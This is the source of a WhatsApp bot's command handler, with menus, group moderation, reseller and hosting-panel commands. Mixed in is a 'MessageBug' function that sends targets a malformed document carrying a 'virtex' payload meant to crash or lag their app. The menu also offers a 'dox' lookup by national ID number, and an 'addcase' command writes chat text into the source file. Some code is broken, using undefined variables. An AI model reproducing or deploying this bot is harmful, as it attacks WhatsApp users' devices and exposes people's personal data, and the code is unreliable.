module.exports = async (Klee, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //if you want no prefix change to this: const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
let crypto = require('crypto')
const makeid = crypto.randomBytes(3).toString('hex')
const { Client } = require('ssh2');
const quoted = m.quoted ? m.quoted : m
const from = m.key.remoteJid
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await Klee.decodeJid(Klee.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Klee.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {}
let participant_sender = isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { version } = require("./package.json")
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const { Scraper } = require("akiraa-wb");
const Skrep = new Scraper()
const antilink = JSON.parse(fs.readFileSync('./all/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./all/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const reseller = JSON.parse(fs.readFileSync("./all/database/reseller.json"))
const { teksbug1 } = require("./all/database/virtex.js")
const { teksbug2 } = require("./all/database/delay.js")
const isReseller = reseller.includes(m.sender)
const { BingImageCreator } = require("./all/bingimg.js");
const { jadibot, stopjadibot, listjadibot } = require('./clonebot/jadibot')
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}

const MessageBug = async (target) => {
return Klee.sendMessage(target, {document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Paket.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
}

let ppuser
try {
ppuser = await Klee.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

async function KleeReply(teks) {
return Klee.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, title: "｢ ACCESS DENIED ｣", body: "© Powered By "+namabot, previewType: "PHOTO"}}}, {quoted: m})
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: namabot
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363321705798318@newsletter`,
newsletterName: `Lazack`,
jpegThumbnail: "",
caption: `Powered By ${namaowner}`,
inviteExpiration: Date.now() + 1814400000
}
}}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${namaowner}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By jflex`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${namaowner}`, jpegThumbnail: ""}}}


const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

if (global.owneroff && !isCmd) {
if (!isGroup && !isOwner) {
let teks = `*Hi bro* @${m.sender.split('@')[0]}

Sorry *My Owner Is Offline*, Please Wait for The Owner to Return Online & Don't Spam Chat`
return Klee.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./media/ownermode.jpg"), renderLargerThumbnail: false, title: "｢ OWNER OFFLINE MODE ｣", mediaUrl: linkgc, sourceUrl: linkyt, previewType: "PHOTO"}}}, {quoted: null})
}}

if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|its all about whatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await Klee.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Klee.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} I'm sorry I'm going to remove you from this group because the admin/owner of the bot has enabled the *antilink* feature of another group`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Klee.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await Klee.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}

if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await Klee.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Klee.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} I'm sorry I deleted your message because the admin/owner of the bot turned on the *antilink* feature of other groups!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./media/warning.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Klee.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}

let example = (teks) => {
return `\n*try correctly:*\nexample *${cmd}* ${teks}\n`
}

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const reply = (teks) => {
return Klee.sendMessage(from, { text: teks, contextInfo:{
mentionedJid: [m.sender], 
"externalAdReply": {"title": ` ${botname}`,"body": `good kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ppuser,"thumbnail": '',"sourceUrl": ``}}}, { quoted:m})} 

switch (command) {
case "p": case "pp": {
let teksmenu = `
*Haii* @${m.sender.split("@")[0]}, good day\nIs there anything i can help you?

 ▬▭▬▭[ *ɪɴғᴏ ᴜsᴇʀ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *_NAME_* : ${pushname}
│► > *NUMBER* : ${m.sender.split('@')[0]}
╰───────────────t⪩
▬▭▬▭[ *sᴛᴀᴛᴜs ʙᴏᴛ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *NAME OF BOT* : ${global.namabot2}
│► > *CREATOR NUMBER* : @${global.owner2}
│► > *_VERSION_* : ${version}
│► > *_RUNTIME_* : ${runtime(process.uptime())}
╰───────────────t⪩

╭───➢ • *LIST MENU* •
│ ${prefix}allmenu
│ ${prefix}mainmenu
│ ${prefix}downloadmenu
│ ${prefix}convertmenu
│ ${prefix}panelmenu
│ ${prefix}installpanelmenu
│ ${prefix}jadibotmenu
│ ${prefix}grupmenu
│ ${prefix}ownermenu
╰────────────────➢

-  document is still private and not made public
-  document is still in the development stage, it is understood that there are still many services that have errors because they are still being fixed.
`

Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/thumbnail.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt,mediaType: 1,
renderLargerThumbnail: true }}}, {quoted: qchanel})
}
break
case "menu":
case "allmenu": {
let teksmenu = `
*Haii* @${m.sender.split("@")[0]}, good day\nIs there anything i can help you?

 ▬▭▬▭[ *ɪɴғᴏ ᴜsᴇʀ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *_NAME_* : ${pushname}
│► > *NUMBER* : ${m.sender.split('@')[0]}
╰───────────────t⪩
▬▭▬▭[ *sᴛᴀᴛᴜs ʙᴏᴛ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *NAME OF BOT* : ${global.namabot2}
│► > *CREATOR NUMBER* : @${global.owner2}
│► > *_VERSION_* : ${version}
│► > *_RUNTIME_* : ${runtime(process.uptime())}
╰───────────────t⪩

╭───➢ • *M A I N M E N U* •
│ > ${prefix}yts
│ > ${prefix}remini
│ > ${prefix}sticker
│ > ${prefix}pinterest
│ > ${prefix}qc
│ > ${prefix}dox ( nik )
╰────────────────➢

╭───➢ • *CONVERT MENU* •
│ > ${prefix}toaudio
│ > ${prefix}tomp3
│ > ${prefix}tovn
│ > ${prefix}toptv
│ > ${prefix}tts
│ > ${prefix}toimage
╰────────────────➢

╭───➢ • *DOMAIN MENU* •
│ > ${prefix}listdomain
│ > ${prefix}listsubdomain
│ > ${prefix}delsubdomain
╰────────────────➢

╭───➢ • *DOWNLOAD MENU* •
│ > ${prefix}play
│ > ${prefix}play2
│ > ${prefix}splay
│ > ${prefix}tiktok
│ > ${prefix}spdl 
│ > ${prefix}facebook(coming soon)
│ > ${prefix}ytmp3(coming soon)
╰────────────────➢

╭───➢ • *GROUP MENU* •
│ > ${prefix}addmember
│ > ${prefix}antilink
│ > ${prefix}antilinkV2
│ > ${prefix}hidetag
│ > ${prefix}tagall
│ > ${prefix}delete
│ > ${prefix}open/close
│ > ${prefix}setnamagc
│ > ${prefix}setdeskgc
│ > ${prefix}setppgc
│ > ${prefix}kick
│ > ${prefix}promote
│ > ${prefix}leavegc
│ > ${prefix}leavegc2
│ > ${prefix}demote
╰────────────────➢

╭───➢ • *OWNER MENU* •
│ > ${prefix}clearsession
│ > ${prefix}anticall
│ > ${prefix}autoread
│ > ${prefix}welcome
│ > ${prefix}setthumbnail
│ > ${prefix}setppbotpanjang
│ > ${prefix}setppbot
│ > ${prefix}setnamabot
│ > ${prefix}setbiobot
╰────────────────➢

╭───➢ • *JADIBOT MENU* •
│ > ${prefix}pair
│ > ${prefix}stopjadibot
│ > ${prefix}listjadibot
╰────────────────➢

https://home.lazackorganisation.my.id
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt,mediaType: 1,
renderLargerThumbnail: true }}}, {quoted: qchanel})
}
break

case "jadibotmenu": {
let teksmenu = `
*Haii* @${m.sender.split("@")[0]}, good day\nIs there anything i can help you?

 ▬▭▬▭[ *ɪɴғᴏ ᴜsᴇʀ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *_NAME_* : ${pushname}
│► > *NUMBER* : ${m.sender.split('@')[0]}
╰───────────────t⪩
▬▭▬▭[ *sᴛᴀᴛᴜs ʙᴏᴛ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *NAME OF BOT* : ${global.namabot2}
│► > *CREATOR NUMBER* : @${global.owner2}
│► > *_VERSION_* : ${version}
│► > *_RUNTIME_* : ${runtime(process.uptime())}
╰───────────────t⪩


╭───➢ • *JADIBOT MENU* •
│ > ${prefix}pair
│ > ${prefix}stopjadibot
│ > ${prefix}listjadibot
╰────────────────➢
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt,mediaType: 1,
renderLargerThumbnail: true }}}, {quoted: qchanel})
}
break

case "convertmenu": {
let teksmenu = `
*Haii* @${m.sender.split("@")[0]}, good day\nIs there anything i can help you?

 ▬▭▬▭[ *ɪɴғᴏ ᴜsᴇʀ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *_NAME_* : ${pushname}
│► > *NUMBER* : ${m.sender.split('@')[0]}
╰───────────────t⪩
▬▭▬▭[ *sᴛᴀᴛᴜs ʙᴏᴛ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *NAME OF BOT* : ${global.namabot2}
│► > *CREATOR NUMBER* : @${global.owner2}
│► > *_VERSION_* : ${version}
│► > *_RUNTIME_* : ${runtime(process.uptime())}
╰───────────────t⪩


╭───➢ • *CONVERT MENU* •
│ > ${prefix}toaudio
│ > ${prefix}tomp3
│ > ${prefix}tovn
│ > ${prefix}toptv
│ > ${prefix}tts
│ > ${prefix}toimage
╰────────────────➢
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt,mediaType: 1,
renderLargerThumbnail: true }}}, {quoted: qchanel})
}
break
case "installpanelmenu": {
let teksmenu = `
*Haii* @${m.sender.split("@")[0]}, good day\nIs there anything i can help you?

 ▬▭▬▭[ *ɪɴғᴏ ᴜsᴇʀ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *_NAME_* : ${pushname}
│► > *NUMBER* : ${m.sender.split('@')[0]}
╰───────────────t⪩
▬▭▬▭[ *sᴛᴀᴛᴜs ʙᴏᴛ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *NAME OF BOT* : ${global.namabot2}
│► > *CREATOR NUMBER* : @${global.owner2}
│► > *_VERSION_* : ${version}
│► > *_RUNTIME_* : ${runtime(process.uptime())}
╰───────────────t⪩

╭───➢ • *INSTALL  PANEL* •
│ > ${prefix}install-panel
│ > ${prefix}install-wings
│ > ${prefix}configure-wings
│ > ${prefix}installpanel (Install Panel & wings & create node)
│ > ${prefix}startwings
│ > ${prefix}install-stellar
│ > ${prefix}install-billing
│ > ${prefix}install-enigma
│ > ${prefix}uninstall-thema
│ > ${prefix}uninstall-panel
╰────────────────➢
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt,mediaType: 1,
renderLargerThumbnail: true }}}, {quoted: qchanel})
}
break
case "panelmenu": {
let teksmenu = `
*Haii* @${m.sender.split("@")[0]}, good day\nIs there anything i can help you?

 ▬▭▬▭[ *ɪɴғᴏ ᴜsᴇʀ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *_NAME_* : ${pushname}
│► > *NUMBER* : ${m.sender.split('@')[0]}
╰───────────────t⪩
▬▭▬▭[ *sᴛᴀᴛᴜs ʙᴏᴛ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *NAME OF BOT* : ${global.namabot2}
│► > *CREATOR NUMBER* : @${global.owner2}
│► > *_VERSION_* : ${version}
│► > *_RUNTIME_* : ${runtime(process.uptime())}
╰───────────────t⪩

╭───➢ • *PANEL MENU* •
│ > ${prefix}addseller
│ > ${prefix}delseller
│ > ${prefix}listseller
│ > ${prefix}addadmin / cadp
│ > ${prefix}addadmin2  / cadp
│ > ${prefix}cpanel
│ > ${prefix}cpanel2
│ > ${prefix}listpanel
│ > ${prefix}listadmin
│ > ${prefix}deladmin
│ > ${prefix}delpanel
╰────────────────➢
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt,mediaType: 1,
renderLargerThumbnail: true }}}, {quoted: qchanel})
}
break
case "domainmenu": {
let teksmenu = `
*Haii* @${m.sender.split("@")[0]}, good day\nIs there anything i can help you?

 ▬▭▬▭[ *ɪɴғᴏ ᴜsᴇʀ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *_NAME_* : ${pushname}
│► > *NUMBER* : ${m.sender.split('@')[0]}
╰───────────────t⪩
▬▭▬▭[ *sᴛᴀᴛᴜs ʙᴏᴛ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *NAME OF BOT* : ${global.namabot2}
│► > *CREATOR NUMBER* : @${global.owner2}
│► > *_VERSION_* : ${version}
│► > *_RUNTIME_* : ${runtime(process.uptime())}
╰───────────────t⪩

╭───➢ • *DOMAIN MENU* •
│ > ${prefix}listdomain
│ > ${prefix}listsubdomain
│ > ${prefix}delsubdomain
│ > ${prefix}domain1 hostname|ipvps
│ > ${prefix}domain2 hostname|ipvps
│ > ${prefix}domain3 hostname|ipvps
╰────────────────➢
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt,mediaType: 1,
renderLargerThumbnail: true }}}, {quoted: qchanel})
}
break
case "grupmenu": {
let teksmenu = `
*Haii* @${m.sender.split("@")[0]}, good day\nIs there anything i can help you?

 ▬▭▬▭[ *ɪɴғᴏ ᴜsᴇʀ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *_NAME_* : ${pushname}
│► > *NUMBER* : ${m.sender.split('@')[0]}
╰───────────────t⪩
▬▭▬▭[ *sᴛᴀᴛᴜs ʙᴏᴛ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *NAME OF BOT* : ${global.namabot2}
│► > *CREATOR NUMBER* : @${global.owner2}
│► > *_VERSION_* : ${version}
│► > *_RUNTIME_* : ${runtime(process.uptime())}
╰───────────────t⪩

╭───➢ • *GROUP MENU* •
│ > ${prefix}addmember
│ > ${prefix}antilink
│ > ${prefix}antilinkV2
│ > ${prefix}hidetag
│ > ${prefix}tagall
│ > ${prefix}delete
│ > ${prefix}open/close
│ > ${prefix}setnamagc
│ > ${prefix}setdeskgc
│ > ${prefix}setppgc
│ > ${prefix}kick
│ > ${prefix}promote
│ > ${prefix}leavegc
│ > ${prefix}leavegc2
│ > ${prefix}demote
╰────────────────➢
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt,mediaType: 1,
renderLargerThumbnail: true }}}, {quoted: qchanel})
}
break
case "ownermenu": {
let teksmenu = `
*Haii* @${m.sender.split("@")[0]}, good day\nIs there anything i can help you?

 ▬▭▬▭[ *ɪɴғᴏ ᴜsᴇʀ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *_NAME_* : ${pushname}
│► > *NUMBER* : ${m.sender.split('@')[0]}
╰───────────────t⪩
▬▭▬▭[ *sᴛᴀᴛᴜs ʙᴏᴛ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *NAME OF BOT* : ${global.namabot2}
│► > *CREATOR NUMBER* : @${global.owner2}
│► > *_VERSION_* : ${version}
│► > *_RUNTIME_* : ${runtime(process.uptime())}
╰───────────────t⪩

╭───➢ • *OWNER MENU* •
│ > ${prefix}clearsession
│ > ${prefix}anticall
│ > ${prefix}autoread
│ > ${prefix}welcome
│ > ${prefix}setthumbnail
│ > ${prefix}setppbotpanjang
│ > ${prefix}setppbot
│ > ${prefix}setnamabot
│ > ${prefix}setbiobot
╰────────────────➢
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt,mediaType: 1,
renderLargerThumbnail: true }}}, {quoted: qchanel})
}
break
case "cpanel": case "cpanel2": {
let textmenu =`
 *Haii* @${m.sender.split("@")[0]}, good day\nIs there anything i can help you?

 ▬▭▬▭[ *ɪɴғᴏ ᴜsᴇʀ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *_NAME_* : ${pushname}
│► > *NUMBER* : ${m.sender.split('@')[0]}
╰───────────────t⪩
▬▭▬▭[ *sᴛᴀᴛᴜs ʙᴏᴛ* ]▬▭▬▭▬  
╭───────────────⪩
│► > *NAME OF BOT* : ${global.namabot2}
│► > *CREATOR NUMBER* : @${global.owner2}
│► > *_VERSION_* : ${version}
│► > *_RUNTIME_* : ${runtime(process.uptime())}
╰───────────────t⪩

╭───➢ • *Cpanel Versi 1 ( owner only )* •
│ > ${prefix}cp1gb (name)
│ > ${prefix}cp2gb (name)
│ > ${prefix}cp3gb (name)
│ > ${prefix}cp4gb (name)
│ > ${prefix}cp5gb (name)
│ > ${prefix}cp6gb (name)
│ > ${prefix}cp7gb (name)
│ > ${prefix}cp8gb (name)
│ > ${prefix}cp9gb (name)
│ > ${prefix}cpunli (name)
╰────────────────➢

╭───➢ • *Cpanel Versi 2* •
│ > ${prefix}cp1gbv2 (name, number)
│ > ${prefix}cp2gbv2 (name, number)
│ > ${prefix}cp3gbv2 (name, number)
│ > ${prefix}cp4gbv2 (name, number)
│ > ${prefix}cp5gbv2 (name, number)
│ > ${prefix}cp6gbv2 (name, number)
│ > ${prefix}cp7gbv2 (name, number)
│ > ${prefix}cp8gbv2 (name, number)
│ > ${prefix}cp9gbv2 (name, number)
│ > ${prefix}cp10gbv2 (name, number)
│ > ${prefix}cpunliv2 (name, number)
╰────────────────➢
`
Klee.sendMessage(m.chat, {text: `${teksmenu}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: { showAdAttribution: true,
thumbnail: fs.readFileSync("./media/thumbnail2.jpg"), title: `© ${namabot} - ${version}`, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt,mediaType: 1,
renderLargerThumbnail: true }}}, {quoted: qchanel})
}
break
case "addseller": {
if (!isOwner) return KleeReply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (reseller.includes(orang)) return reply(`User ${person.split('@')[0]} is already registered in the Reseller Panel database!`)
await reseller.push(orang)
await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
reply(`Successfully made ${person.split('@')[0]} as a reseller panel`)
} else {
return reply(example("@tag/255734"))
}}
break
case "delseller": {
if (!isOwner) return KleeReply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!reseller.includes(orang)) return reply(`User ${person.split('@')[0]} is not listed in the Reseller Panel database!`)
let indx = reseller.indexOf(orang)
await reseller.splice(indx, 1)
await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(reseller))
reply(`Successfully removed ${person.split('@')[0]} from the Reseller Panel database`)
} else {
return reply(example("@tag/255734"))
}}
break
case "listseller": {
if (!isOwner) return KleeReply(msg.owner)
if (reseller.length < 1) return reply("No Reseller Panel")
let teksnya = ` LIST RESELLER PANEL⚡\n\n`
reseller.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
Klee.sendMessage(m.chat, {text: teksnya, mentions: [...reseller]}, {quoted: qtoko})
}
break
case "yts": {
if (!text) return reply(example("Dj Tiktok"))
await reply(msg.wait)
await yts(text).then(async (data) => {
if (data.all.length == 0) return reply(mess.error)
let teks = '\n*🔎Search results YOUTUBE*\n\n'
for (let i of data.all) {
teks += `*◦ results :* ${i.title}
*◦ Channel :* ${i.author?.name || "unknown"}
*◦ Duration :* ${i?.timestamp || "unknown"}
*◦ Link Url :* ${i.url}\n\n`
}
reply(teks)
}).catch(err => reply(err.toString()))
}
break

case 'addcase': {
 if (!isOwner) return reply('who are you dog?')
 if (!text) return reply('Where is the case?');
    const fs = require('fs');
const namaFile = 'case.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('An error occurred while reading the file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('An error occurred while writing the file:', err);
            } else {
                reply('New case successfully added.');
            }
        });
    } else {
        reply('Cannot add case in file.');
    }
});

}
break

case "setthumb": case "setthumbnail": {
if (!isOwner) return KleeReply(msg.owner)
if (!/image/g.test(mime)) return reply("Kirim/Balas Foto")
await Klee.downloadAndSaveMediaMessage(qmsg, "./media/thumbnail.jpg", false)
reply("Successfully Changing Menu Thumbnail Photos ✅")
}
break
case 'antibot': {

if (!isOwner) return
    if (!m.isGroup) return
if (args[0] === "on") {
if (!text) return reply('antibot mode on ')
antibot.push(from)
fs.writeFileSync('./all/antibot.json', JSON.stringify(antibot))
reply('Success in turning on antibot in this group')
var groupe = await Klee.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Klee.sendMessage(from, {text: `\`\`\` Warning \`\`\`\n\nde bot detects lol be care or byee`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!text) return reply('anti bot mode ')
let off = antibott.indexOf(from)
antibott.splice(off, 1)
fs.writeFileSync('./all/antibot.json', JSON.stringify(antibot))
reply('Success in turning off antibot in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
          case 'tt': {
  let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFSqcuXb/`

    if (!text) return m.reply(input)
    
